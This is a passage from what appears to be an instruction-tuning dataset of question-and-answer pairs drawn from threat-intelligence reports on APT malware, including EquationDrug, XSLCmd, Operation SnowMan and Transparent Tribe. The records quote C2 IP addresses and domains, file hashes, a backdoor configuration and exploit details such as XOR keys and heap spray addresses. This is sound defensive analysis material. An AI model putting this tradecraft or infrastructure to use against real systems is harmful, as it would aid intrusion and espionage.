getCurrentState\n0x80002008 setFilteringRules\n0x8000200C getFilteringRules\n0x80002024 getDumpFileSize\n0x80002010/0x80002014/0x80002018/0x8000201C pause/resume\n0x80002020 getVersion - returns 2.4.0\nDriver has three logical parts, and uses an incomplete function pointer table as interface:\n1. Business logic: \u0141ltering rules, packet dumping, device ioctl, options\n2. Ndis driver skeleton\n3. Primitives lib: Strings, XORing, registry I/O\nThe code is of very good quality. It looks more complicated than Winpcap 2.3 (released 28 mar 2002), but less so than Winpcap 3.0 (released by 10 apr 2003). Interestingly, the driver identi\u0141es itself as \"version 2.4\" in the pcap \u0141le despite there being no Winpcap version 2.4.\nQ: How does the 'tdip.sys' driver in the EquationDrug platform capture and store network packets, and what file format and encryption method does it use?",
    "output": "The 'tdip.sys' driver in the EquationDrug platform captures incoming network traffic on Ethernet and VPN interfaces and implements a Berkeley Packet Filter (BPF) style packet filtering system. The captured packets can be written to disk in libpcap format (magic number 0xA1B2C3D4 version 2.4) and are encrypted with a one-byte XOR, using the key 0xE3. The driver's configuration, including filtering rules and file paths, is stored in the registry under the key '[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\tdip]'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Known Samples\nThe following table identifies the known ZoxPNG samples along with key metadata for each.\nTwo of the known samples (SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 and SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2) are signed using a signature from \"4NB Corp.\" which appears to be a South Korean video conferencing and cloud service provider (www.4nb.co.kr). The signing certificate for the two samples has a valid time range of 21 June 2011 to 21 July 2013. Sample SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 reports a valid digital signature whereas sample SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2 reports that the certificate has expired. Figures 6 and 7 show the differences between the two digital signatures for the signed samples.\nBig Headline: Evolution\nSample SHA1:b51e419bf999332e695501c62c5b4aee5b070219 appears to have a tangential relationship to the ZoxPNG samples listed above. The sample, known as ZoxRPC, has a compile date of 11 July 2008 at 04:28:21, placing it nearly 5 years ahead of the known ZoxPNG samples. Given the large time differential between ZoxRPC and ZoxPNG, making a direct relationship between the two generations is difficult. There are several attributes that would appear to indicate a connection between the two Zox variants:\n1. The use of the term \"iiscmd\" with a relationship to the remote shell functionality\n2. The identifiers used for each command roughly align.\nZoxRPC uses the MS08-067 vulnerability, specifically portions of code found on this public website: http://www.pudn.com/downloads183/sourcecode/hack/exploit/detail861817.html. One interesting aspect of the ZoxRPC malware is the list of targeting offsets for the MS08-067 exploit. The offsets are associated with specific regional version of Windows. The following identifiers were found within ZoxRPC:\n\u2022 KR Windows All bypass DEP\n\u2022 JP Windows All bypass DEP\n\u2022 EN Windows All bypass DEP\n\u2022 TW Windows All bypass DEP\n\u2022 CN Windows All bypass DEP\nThe list itself indicates a specific set of regional targets that the operators of ZoxRPC are going after.\nBy researching the unique strings related to the iiscmd, iisput, and iisget strings, it appears that the original source code, upon which all Zox variants are based, dates back to 2002. As part of the IIS vulnerability disclosure of 2002 for the vulnerability MS02-018, the source code for the proof of concept code contains not only several strings found within the Zox binaries, but several of the functions as well. The source code upon which the Zox family is based is found at http://www.exploit-db.com/download/21371/, which was written by well-known Chinese hacker yuange. Given the several years between the original source code (2002) and both ZoxPNG (2013) and ZoxRPC (2008), the code upon which Zox is based has mutated and evolved, but there are clearly sections of code that have remained largely unaltered.\nQuestion: How does the use of legitimate certificates by ZoxPNG samples impact the detection and mitigation strategies employed by cybersecurity professionals? Explain the implications of the certificate expiration status on these strategies.",
    "output": "Answer: The use of legitimate certificates by ZoxPNG samples, particularly those signed by '4NB Corp.', complicates detection and mitigation efforts. Legitimate certificates can make malicious software appear benign, allowing it to bypass traditional antivirus and security measures. The fact that one sample (SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08) has a valid digital signature while another (SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2) has an expired certificate highlights the importance of continuous monitoring and verification of certificate statuses. Expired certificates might still be used in some cases, but they are easier to flag and block. Cybersecurity professionals need to implement robust certificate validation mechanisms and stay updated on the latest threat intelligence to effectively counteract such tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Crouching Yeti APT exploit CVE-2012-1889 to execute arbitrary code on a victim's system?",
    "output": "CVE-2012-1889 is a vulnerability in Microsoft XML Core Services that allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site. The Crouching Yeti APT exploits this vulnerability by using a crafted web page to access uninitialized memory locations, which enables the execution of arbitrary code. Specifically, the APT uses a malicious HTML file, 'irl.html', to exploit CVE-2012-1889 and download additional malware components, including 'sysplug.exe' and 'crtscp.exe'. These components are then executed on the victim's system, allowing the APT to gain control and exfiltrate sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nBlackBerry has uncovered a previously unknown threat actor targeting an aerospace organization in the United States, with the apparent goal of conducting commercial and competitive cyber espionage. The (<https://blogs.blackberry.com/en/author/the-blackberry-research-and-intelligence-team>)BlackBerry Threat Research and Intelligence team is tracking this threat actor as AeroBlade. The actor used spear-phishing as a delivery mechanism: A weaponized document, sent as an email attachment, contains an embedded remote template injection technique and a malicious VBA macro code, to deliver the next stage to the final payload execution.\nEvidence suggests that the attacker's network infrastructure and weaponization became operational around September 2022. BlackBerry assesses with medium to high confidence that the offensive phase of the attack occurred in July 2023. The attacker improved its toolset during that time, making it stealthier, while the network infrastructure remained the same.\nGiven the final payload functionality and the subject of the attack, BlackBerry assesses with medium to high confidence that the goal of this attack was commercial cyber espionage.\n\nQuestion: How did the AeroBlade threat actor utilize spear-phishing to deliver its payload, and what techniques were employed to enhance the stealthiness of its toolset over time?\n\nAnswer:",
    "output": "The AeroBlade threat actor utilized spear-phishing by sending a weaponized document as an email attachment. This document contained an embedded remote template injection technique and malicious VBA macro code to deliver the next stage leading to the final payload execution. Over time, the attacker improved its toolset to become stealthier. This enhancement likely involved refining the methods used to evade detection, such as obfuscating the malicious code or employing anti-virus evasion techniques, while keeping the network infrastructure unchanged.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Houdini's Magic Reappearance\nBy Anthony Kasza and Esmid Idrizovic\nUnit 42 has observed a new version of Hworm (or Houdini) being used within multiple attacks. This blog outlines technical details of this new Hworm version and documents an attack campaign making use of the backdoor. Of the samples used in this attack, the first we observed were June 2016, while as-of publication we were still seeing attacks as recently as mid-October, suggesting that this is likely an active, ongoing campaign.\nRead the text above and answer this question: Why did Unit 42 consider the new version of Hworm (or Houdini) to be part of an active, ongoing campaign? Explain the timeline and significance of this observation.",
    "output": "Unit 42 considered the new version of Hworm (or Houdini) to be part of an active, ongoing campaign because they observed the first samples of this version in June 2016. As of the publication date of the report, they were still seeing attacks using this version as recently as mid-October. This continuous activity over several months indicated that the campaign was not a one-time event but rather a sustained effort, highlighting the need for ongoing vigilance and monitoring by cybersecurity professionals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: XSLCmd for OS X Analysis\nThe XSLCmd backdoor for OS X was submitted to VirusTotal (MD5: 60242ad3e1b6c4d417d4dfeb8fb464a1) on August 10, 2014, with 0 detections at the time of submission. The sample is a universal Mach-O executable file supporting the PowerPC, x86, and x86-64 CPU architectures. The code within contains both an installation routine that is carried out the first time it is executed on a system, and the backdoor routine which is carried out after confirming that its parent process is launchd (the initial user mode process of OS X that is responsible for, amongst other things, launching daemons).\nThe backdoor code was ported to OS X from a Windows backdoor that has been used extensively in targeted attacks over the past several years, having been updated many times in the process. Its capabilities include a reverse shell, file listings and transfers, installation of additional executables, and an updatable configuration. The OS X version of XSLCmd includes two additional features not found in the Windows variants we have studied in depth: key logging and screen capturing.\nBig Headline: Installation Routine\nTo install, XSLCmd first determines the endianness of the CPU using NXGetLocalArchInfo and whether or not it is running as the super user by comparing the return value of getuid()with 0. The code includes functions to handle endianness differences when dealing with file and network data on a system using big endian, namely older Apple computers that shipped with PowerPC CPUs. The process copies its Mach-O from its current location to $HOME/Library/LaunchAgents/clipboardd and creates a plist file in the same directory with the name com.apple.service.clipboardd.plist. The latter file ensures that the backdoor is launched after the system is rebooted once the user logs in. After this is done, the malware relaunches itself using the 'load' option of the launchctl utility, which runs the malware according to its configuration in the plist file it created, with launchd as its parent process. This is the process that begins the actual backdoor routine of waiting for and executing commands issued from the C2 server.\nAfter running itself with launchctl, the initial process forks and deletes the Mach-O from the original location from which it was executed. The installation routine differs slightly depending on whether or not the process is running with super user privileges. If run as super user, it copies itself to /Library/Logs/clipboardd. Interestingly, if run as super user, the process will also copy /bin/ksh to /bin/ssh. /bin/ksh is the Korn shell executable, and if the user sends a command to initialize a reverse shell, it will use the copy of ksh to do so instead of /bin/bash.\nThis is likely done to make it less obvious that a reverse shell is running on the system, since it may raise less suspicion to see an ssh process opening a network socket rather than a bash process, although the real ssh executable is actually located in /usr/bin/ssh, not /bin/ssh. A list of possible files created by XSLCmd is included in Appendix 1 at the end of this blog.\nBig Headline: Configuration Options\nXSLCmd ships with an encrypted configuration file that it defaults to if there is no configuration file written to disk. It will only write its configuration file to disk if it's updated by the user. It runs in a loop, checking for a configuration update, and then checking for commands. If a new configuration is available, it will be written to disk in base64 encoding at $HOME/.fontset/pxupdate.ini. Below is the configuration data stored in the XSLCmd sample we obtained.\n[ListenMode]\n0\n[MServer]\n61.128.110.38:8000\n[BServer]\n61.128.110.38\n[Day]\n1,2,3,4,5,6,7\n[Start Time]\n00:00:00\n[End Time]\n23:59:00\n[Interval]\n60\n[MWeb]\nhttp://1234/config.htm\n[BWeb]\nhttp://1234/config.htm\n[MWebTrans]\n0\n[BWebTrans]\n0\n[FakeDomain]\nwww.appleupdate.biz\n[Proxy]\n0\n[Connect]\n1\n[Update]\n0\n[UpdateWeb]\nnot use\n[MServer] and [BServer] specify the main and backup C2 server addresses, which can be either an IP address or domain name. Only [MServer] needs to specify a port.\n[Day] specifies which days of the week the malware will poll for commands and configuration updates on where Monday is 1.\n[Start Time] specifies the local time of day to begin polling.\n[End Time] specifies the local time of day to stop polling.\n[Interval] specifies the number of seconds between polls.\n[MWeb] and [BWeb] specify the main and backup URLs to poll for configuration updates, respectively. Update checks are not performed if these values are left to their default: http://1234/config.htm\nOther options will be explained where appropriate later in the blog.\nBig Headline: C2 Protocol\nXSLCmd uses pseudo-HTTP for its protocol. It opens a socket and uses a string template to setup the HTTP request or response headers depending on whether or not it was configured for [Listen Mode]. If [Listen Mode] is set to 1, then it listens on its socket, waiting for a connection for which it will reply to with HTTP response headers following this template:\nHTTP/1.1 200 OK\nCache-Control: no-cache\nContent-Type: application/x-www-form-urlencoded\nServer: Apache/2.0.54 (Unix)\nContent-Encoding: gzip\nContent-Length: %d\nThe body after the headers, regardless of mode, will contain data specific to the purpose of the communication. The data is encrypted with a scheme lifted from a game server engine written by a group named \"(<http://read.pudn.com/downloads146/ebook/635386/src/gameserver/encdec.cpp__.htm>)My Destiny Team.\" The request headers have an interesting feature where the Host and Referer header values will have their domain values populated with the value stored in [Fake Domain]. This value can be any string and has no effect on the network connection established. The value of the 's' argument in the request URL is randomly generated, and all of the other request header values except for Content-Length are hard-coded.\nAnother interesting feature exists for the configuration update function. If [MWebTrans]/[BWebTrans] is set to 1, the configuration update URL request will be proxied through Yahoo's Babelfish service and will fall back to the Google Translate service if that fails.\nAs you can see, the 'trurl' parameter in the URL will be set to whatever is configured for [MWeb]/[BWeb]. The User-Agent header for this request is hard-coded and contains the computer name in the parentheses at the end.\nSSL certificate strings were noticed during our analysis, but with no direct cross-reference to the certificate data.\nHowever, there was a cross-reference to the data directly preceding it. This data began with what looked like SSL handshake headers, so we extracted the data from the executable, wrapped it in a PCAP file, and opened it in Wireshark.\nInterestingly, the data contains everything needed for the server-side packets of an SSL handshake. The SSL certificate being used was for login.live.com and had expired on 6/16/2010. The code using this data opens a socket, waits for a connection, and proceeds to carry out an SSL handshake with the client, throwing away whatever data it receives. This code is not directly referenced by any other code in the executable but could very well replace the [Listen Mode] code. Perhaps it is an old feature no longer in use, a new feature yet to be fully implemented, or an optional feature only used in certain cases.\nBig Headline: Observations\nWe noticed a mix of manually constructed and plain referenced strings throughout the code, sometimes side-by-side in the same function even. This gives the impression of someone working with someone else's code, adding his own touch and style here and there as he goes.\nAlso of note is that XSLCmd will not perform key logging if run as super user. This can be a problem, because the API used to perform the key logging, CGEventTapCreate, when invoked with the parameters it uses, requires root permissions\nfrom the calling process or the \"Assistive Devices\" feature must be enabled for the application. During the initial installation, there is a routine to (<http://hints.macworld.com/article.php?story=20060203225241914>)programmatically enable assistive devices that will be executed if the OS X version is not 10.8. In 10.9, enabling assistive devices permissions is done on a per application basis with no direct API to achieve this.\nIt is interesting to note that the version check does not account for versions above 10.8, indicating that perhaps 10.8 was the latest version at the time the code was written, or at least the most common. Further supporting this inference is the lack of testing performed on 10.9. This variant uses an API from the private Admin framework that is no longer exported in 10.9, causing it to crash. The effort to support PowerPC with the endian conversion functions is worth mentioning.\nCoupling this observation with the aforementioned fact that elsewhere in the code, the version of OS X is compared with 10.8, one could deduce that efforts were made to be backwards compatible with older OS X systems. For some frame of reference, Apple's first OS to drop support for PowerPC was OS X 10.6 released in 2009, and OS X 10.9 was released in October of 2013.\nRead the text above and answer this question: How does the XSLCmd backdoor handle its configuration options, and what happens when a new configuration is available?",
    "output": "XSLCmd ships with an encrypted configuration file that it defaults to if there is no configuration file written to disk. It runs in a loop, checking for configuration updates and commands. If a new configuration is available, it will be written to disk in base64 encoding at $HOME/.fontset/pxupdate.ini. The configuration options include settings for C2 servers, polling times, intervals, and update URLs, among others.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 1.2 Stuxnet versus Aurora\nIn the past year, the public has become aware of two targeted attacks, codenamed Stuxnet and Aurora. Both of these attacks have some common features that characterize recent trends in targeted attacks. Nowadays, the most popular vector of penetration of the user's machine is realized through popular client-side applications (browsers, plugins and other apps). It is much easier to steal data by launching an indirect attack on people with access to important information via a malicious web site, than it is to attack the company's well-protected database server directly. The use of client-side applications as a vector of attack is undoubtedly expected by cautious system users and administrators, but this attack methodology is less predictable and harder to protect against, since in everyday life we use many applications, each of them potentially an attack vector.\nThe Aurora and Stuxnet attacks used 0-day exploits to install malicious programs onto the system. Table 1.2.1 presents data on the malicious programs and exploits used:\nTable 1.2.1 \u2013 Malicious Software and Exploits Used to Perform Attacks\nTable 1.2.2 \u2013 Platforms Vulnerable to 0-Day Attack Vector\nThe exploit ESET detects as JS/Exploit.CVE-2010-0249 (MS10-002) has a narrower range of possible vectors of distribution than LNK/Exploit.CVE-2010-2568 (MS10-046). The range of vulnerabilities used in the Stuxnet attack have other interesting features making use of such infection vectors as removable flash drives and other USB devices, and resources shared over the network. The exploit LNK/Exploit.CVE-2010-2568 is by its nature so designed that detection of the exploit's malicious activity is impossible, if you are not aware of its existence. If we compare the features of these two exploits, it seems that JS/Exploit.CVE-2010-0249 is designed for a surprise attack, while in the case of LNK/Exploit.CVE-2010-2568 a long-term, persistent attack was intended. An additional propagation vector (MS10-061) can spread rapidly within the local network. These observations confirm the data from Table 1.2.3, which compares the characteristics of the malicious programs used in these attacks.\nTable 1.2.3 \u2013 Comparison of attacks\nThese two attacks have shown us that no information system is absolutely secure and carefully planned targeted or even semi-targeted attacks put a serious weapon into the hands of bad guys. In the case of Stuxnet there are still a lot of open questions, in our report we try to highlight the technical component of this semi-targeted attack. Stuxnet showed us by example how much can be conceived and achieved using massive semi-targeted attacks.\nWhy semi-targeted? While the payload is plainly focused on SCADA systems, the malware's propagation is promiscuous. Criminal (and nation-state funded) malware developers have generally moved away from the use of self-replicating malware towards Trojans spread by other means (spammed URLs, PDFs and Microsoft Office documents compromised with 0-day exploits, and so on). Once self-replicating code is released, it's difficult to exercise complete control over where it goes, what it does, and how far it spreads (which is one of the reasons reputable researchers have always been opposed to the use of \"good\" viruses and worms: for the bad guys, it also has the disadvantage that as malware becomes more prevalent and therefore more visible, its usefulness in terms of payload delivery is depleted by public awareness and the wider availability of protection).\nAs we describe elsewhere in this document, there were probably a number of participants in the Stuxnet development project who may have very different backgrounds. However, some of the code looks as if it originated with a \"regular\" software developer with extensive knowledge of SCADA systems and/or Siemens control systems, rather than with the criminal gangs responsible for most malcode, or even the freelance hacker groups, sometimes thought to be funded by governments and the military, (for example Wicked Rose) we often associate with targeted attacks. However, it's feasible that what we're seeing here is the work of a more formally-constituted, multi-disciplinary \"tiger team\". Such officially but unpublicized collaborations, resembling the cooperative work with other agencies that anti-malware researchers sometimes engage in, might be more common than we are actually aware.\nOn the other hand, the nature of the .LNK vulnerability means that even though the mechanism is different to the Autorun mechanism exploited by so much malware in recent years, its use for delivery through USB devices, removable media, and network shares, has resulted in wide enough propagation to prevent the malware from remaining \"below the radar\". This may signify misjudgement on the part of a development team that nevertheless succeeded in putting together a sophisticated collaborative project, or a miscommunication at some point in the development process. On the other hand, it may simply mean that the group was familiar enough with the modus operandi characteristic of SCADA sites to gamble on the likelihood that Stuxnet would hit enough poorly-defended, poorly-patched and poorly-regulated PLCs to gain them the information and control they wanted. Since at the time of writing it has been reported by various sources that some 14 or 15 SCADA sites have been directly affected by the infection of PLCs (Programmable Logic Controllers), the latter proposition may have some validity. While the use of these vectors has increased the visibility of the threat, it's likely that it has also enabled access to sites where \"air-gapped\" generic defences were prioritized over automated technical defences like anti-virus, and less automated system updating and patching. This is not a minor consideration, since the withdrawal of support from Windows versions earlier than Windows XP SP3. At the same time, it's clear that there are difficulties for some sites where protective measures may involve taking critical systems offline. While there are obvious concerns here concerning SPoFs (single points of failure), the potential problems associated with fixing such issues retrospectively should not be underestimated.\n\nAnswer this question based on the above context: What were the key differences between the exploits JS/Exploit.CVE-2010-0249 and LNK/Exploit.CVE-2010-2568 used in the Aurora and Stuxnet attacks, respectively, and how did these differences influence the nature of the attacks?",
    "output": "The exploit JS/Exploit.CVE-2010-0249 (MS10-002) had a narrower range of possible distribution vectors compared to LNK/Exploit.CVE-2010-2568 (MS10-046). The Stuxnet attack used vectors such as removable flash drives, USB devices, and network-shared resources. The LNK/Exploit.CVE-2010-2568 was designed to be undetectable unless its existence was known. JS/Exploit.CVE-2010-0249 seemed designed for a surprise attack, while LNK/Exploit.CVE-2010-2568 was intended for a long-term, persistent attack. Additionally, the MS10-061 propagation vector could spread rapidly within a local network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Top five infected countries from June 2019 to June 2020 \u2013 USBWorm excluded\nThe graph includes the highest number of distinct victims, and it shows that Transparent Tribe maintained a strong focus on Afghanistan during the final part of 2019 and then started to focus again on Indian users during 2020.\nWe may speculate that detections in other countries may be related to entities related to main targets, such as personnel of embassies.\nBig Headline: Conclusions\nTransparent Tribe continues to show high activity against multiple targets. In the last twelve months, we observed a broad campaign against military and diplomatic targets, using extensive infrastructure to support their operations and continuous improvements in their arsenal. The group continue to invest in their main RAT, Crimson, to perform intelligence activities and spy on sensitive targets. We do not expect any slowdown from this group in the near future and we will continue to monitor their activities.\nBig Headline: IoC\nThe followings IOC list is not complete. If you want more information about the APT discussed here, as well as a full IOC list, and YARA rules are available to customers of Kaspersky Threat Intelligence Reports. Contact:\n08745568FE3BC42564A9FABD2A9D189F \u2013 Crimson Server Version \"A\" 03DCD4A7B5FC1BAEE75F9421DC8D876F \u2013 Crimson Server Version \"B\" 075A74BA1D3A5A693EE5E3DD931E1B56 \u2013 Crimson Keylogger 1CD5C260ED50F402646F88C1414ADB16 \u2013 Crimson Keylogger CAC1FFC1A967CD428859BB8BE2E73C22 \u2013 Crimson Thin Client E7B32B1145EC9E2D55FDB1113F7EEE87 \u2013 Crimson Thin Client F5375CBC0E6E8BF10E1B8012E943FED5 \u2013 Crimson Main Client 4B733E7A78EBD2F7E5306F39704A86FD \u2013 Crimson Main Client 140D0169E302F5B5FB4BB3633D09B48F \u2013 Crimson USB Driver 9DD4A62FE9513E925EF6B6D795B85806 \u2013 Crimson USB Driver 1ED98F70F618097B06E6714269E2A76F \u2013 Crimson USB Worm F219B1CDE498F0A02315F69587960A18 \u2013 Crimson USB Worm\n64.188.25.206 \u2013 Crimson C2\n173.212.192.229 \u2013 Crimson C2\n45.77.246.69 \u2013 Crimson C2\nnewsbizupdates.net \u2013 Crimson C2\n173.249.22.30 \u2013 Crimson C2\nuronlinestores.net \u2013 Crimson C2\n\nAnswer this question based on the above context: How did Transparent Tribe's target focus evolve from June 2019 to June 2020, and what might explain the presence of detections in countries outside their primary targets?",
    "output": "Transparent Tribe maintained a strong focus on Afghanistan during the latter part of 2019 and shifted their attention back to Indian users in 2020. The presence of detections in other countries may be attributed to entities related to their main targets, such as personnel of embassies. This suggests that the group's activities have a broader reach due to the interconnected nature of their targets' networks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What specific behaviors and characteristics link the analyzed malware to the FinFisher tool, and how were these connections established?",
    "output": "The analyzed malware exhibits several behaviors and characteristics that link it to the FinFisher tool. First, debug strings found in memory of infected processes include 'finspyv4.01' and 'finspyv2', indicating the presence of FinSpy. Additionally, the malware shares unique virtualized code obfuscation techniques with another sample that communicates with Gamma International IP addresses, specifically the domain 'tiger.gamma-international.de'. This domain is associated with Martin Muench, the managing director of Gamma International, a company known for selling surveillance tools including FinSpy. These connections suggest that the malware is likely the FinSpy remote intrusion tool, targeting dissidents in Bahrain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ASLR bypass\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory. We have discussed this technique and other ASLR bypass approaches (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html>)in our blog. One minor difference between the previous approaches and this attack is the heap spray address, which was changed to 0x1a1b2000 in this exploit.\nBig Headline: Shellcode analysis\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload. The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0\u00d795. The attacker appends the payload to the shellcode before pivoting to code control. Then, when the shellcode is executed, the malware creates files \"sqlrenew.txt\" and \"stream.exe\". The tail of the image file is decoded, and written to these files. \"sqlrenew.txt\" is then executed with the LoadLibraryA Windows API call.\nBig Headline: ZxShell payload analysis\nAs documented above, this exploit dropped an XOR (0\u00d795) payload that executed a ZxShell backdoor (MD5: 8455bbb9a210ce603a1b646b0d951bce). The compile date of the payload was 2014-02-11, and the last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down\nThursday amid a severe winter storm.\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations. This particular variant called back to a command and control server located at newss[.]effers[.]com. This domain currently resolves to 118.99.60.142. The domain info[.]flnet[.]org also resolved to this IP address on 2014-02-12.\nBig Headline: Infrastructure analysis\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous resolutions to the following IP addresses:\n58.64.200.178\n58.64.200.179\n103.20.192.4\nWe previously observed Gh0stRat samples with the custom packet flag \"HTTPS\" calling back to book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog also used the \"HTTPS\" version of the (<http://www.emc.com/collateral/hardware/solution-overview/h11146-the-voho-campaign-so.pdf>)Gh0st. We also observed another \"HTTPS\" Gh0st variant connecting to a related command and control server at me[.]scieron[.]com.\nThe me[.]scieron[.]com domain previously resolved to 58.64.199.22. The book[.]flnet[.]org domain also resolved to another IP in the same subnet 58.64.199.0/24. Specifically, book[.]flnet[.]org previously resolved to 58.64.199.27.\nOthers domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com. The domain dll[.]freshdns[.]org resolved to 58.64.199.25. Both ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22.\nA number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the purposes of this blog, we've chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns.\nYou may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog and (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html>)Operation Ephemeral Hydra. Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW's website, the DeputyDog, and the Ephemeral Hydra operations.\nBig Headline: Links to DeputyDog and Ephemeral Hydra\nOther tradecraft similarities between the actor(s) responsible for this campaign and the actor(s) responsible for the DeputyDog/Ephemeral Hydra campaigns include:\nThe use of zero-day exploits to deliver a remote access Trojan (RAT)\nThe use of strategic web compromise as a vector to distribute remote access Trojans\nThe use of a simple single-byte XOR encoded (0\u00d795) payload obfuscated with a .jpg extension\nThe use of Gh0stRat with the \"HTTPS\" packet flag\nThe use of related command-and-control (CnC) infrastructure during the similar time frames\nThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have some identical functions with common typos, and even share the same name.\nBig Headline: Conclusion\nThese actors have previously targeted a number of different industries, including:\nU.S. government entities\nJapanese firms\nDefense industrial base (DIB) companies\nLaw firms\nInformation technology (IT) companies\nMining companies\nNon-governmental organizations (NGOs)\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to long-term.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/malware-research>)Advanced Malware, (<http://www.fireeye.com/blog/category/technical/cyber-exploits>)Exploits, (<http://www.fireeye.com/blog/category/technical/targeted-attack>)Targeted Attack, (<http://www.fireeye.com/blog/category/technical>)Threat Research, (<http://www.fireeye.com/blog/category/technical/vulnerabilities>)Vulnerabilities and tagged (<http://www.fireeye.com/blog/tag/0day>)0day, (<http://www.fireeye.com/blog/tag/zero-day>)zero-day by (<http://www.fireeye.com/blog/author/darien-kindlund>)Darien Kindlund, (<http://www.fireeye.com/blog/author/dan-caselden>)Dan Caselden, (<http://www.fireeye.com/blog/author/xiaobo-chen>)Xiaobo Chen, (<http://www.fireeye.com/blog/author/ned-moran>)Ned Moran and (<http://www.fireeye.com/blog/author/mscott>)Mike Scott. Bookmark the (<http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html>)permalink.\n\nQ: How does the infrastructure analysis in the Operation SnowMan attack reveal links to previous campaigns like DeputyDog and Ephemeral Hydra, and what are the key indicators of these connections?",
    "output": "A: The infrastructure analysis in the Operation SnowMan attack reveals links to previous campaigns through overlapping domains and IP addresses. For instance, the domain info[.]flnet[.]org overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via previous resolutions to specific IP addresses. These domains were also associated with Gh0stRat samples using the 'HTTPS' packet flag, which was a characteristic of the DeputyDog campaign. Additionally, the domain me[.]scieron[.]com resolved to an IP in the same subnet as book[.]flnet[.]org, further linking it to DeputyDog and Ephemeral Hydra. Other domains like dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com also resolved to IPs in this subnet, indicating a broader network of related infrastructure. These connections suggest that the actors behind Operation SnowMan are likely the same or affiliated with those responsible for DeputyDog and Ephemeral Hydra.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Sykipot Activity\nAs previously\t discussed,\t before it expired,\t 'todaygonever.com' pointed to\t a C2 server associated with both the Destroy\t RAT\t and NightDragon malware.\t The same domain is also\t associated with\t Sykipot activity\t through\t shared C2 server infrastructure,\t and\t domain registration information.\nOver its lifetime the domain 'todaygonever.com' pointed to\t numerous IP\t addresses,\t many\t of which are not\t noteworthy as they\t were assigned\t to servers that\t hosted\t numerous websites.\t Four of\t the IP\t addresses,\t however,\t are of particular note \u2013 IP\t addresses 67.90.204.228 (as previously discussed), 67.79.149.90,\t 209.133.72.83 and\t an IP address allocated\t to a large US financial institution.\n82 Malware detected as\t 'Trojan.Win32.AgentBypass' uses\t the callback domain 'bbs.ezxsoft.com'. Malware detected\t as 'Trojan.Win32.Generic'\t uses the callback\t domain 'pc.nprotects.org'. (GFI SandBox 2011) (GFI SandBox 2011)\n83 Both\t pieces\t of malware create a directory named '03a075fb70d5d675f9dc26fc'\t and a subdirectory named 'update'. (GFI SandBox 2011) (GFI SandBox 2011)\n84 For further details\t of the links, refer to the paper 'SK Hack by an Advanced Persistent Threat'. (Command Five Pty Ltd, 2011)\nIP\t address 67.79.149.90 previously\t hosted\t the known Sykipot domain 'help.newcarstyle.com'. Both IP\t address 67.79.149.90 and IP address 209.133.72.83\t previously\t hosted 'bluelightness.com' subdomains85 .\t They therefore have additional links to\t Sykipot activity\t as 'shopping.bluelightness.com' was previously\t hosted on IP\t 